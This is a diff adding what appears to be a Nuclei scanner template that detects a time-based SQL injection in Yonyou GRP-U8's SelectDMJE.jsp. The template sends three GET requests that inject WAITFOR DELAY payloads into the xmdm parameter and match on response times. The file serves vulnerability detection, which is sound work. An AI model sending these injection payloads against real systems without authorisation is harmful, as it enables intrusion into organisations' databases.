@@ -1,0 +1,41 @@
+id: yonyou-u8-grp-selectdmje-sqli
+ 
+info:
+  name: 用友GRP-U8 SelectDMJE.jsp SQL注入漏洞
+  author: SleepingBag945
+  severity: high
+  description: |
+    用友GRP-U8 < 202307
+    在用友GRP-U8的SelectDMJE.jsp gsdm参数存在SQL注入漏洞，由于用友GRP-U8未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。 
+
+http:
+  - raw:
+      - |
+        GET /u8qx/SelectDMJE.jsp?gsdm=1&kjnd=1&userId=1&xmdm=1';WAITFOR+DELAY+'0:0:3'-- HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20
+
+      - |
+        GET /u8qx/SelectDMJE.jsp?gsdm=1&kjnd=1&userId=1&xmdm=1';WAITFOR+DELAY+'0:0:6'-- HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20
+        
+
+      - |
+        GET /u8qx/SelectDMJE.jsp?gsdm=1&kjnd=1&userId=1&xmdm=1';WAITFOR+DELAY+'0:0:9'-- HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6 && status_code==200"
+          - "duration_2>=6  && duration_2<=9 && status_code==200"
+          - "duration_3>=9  && duration_3<=12 && status_code==200"
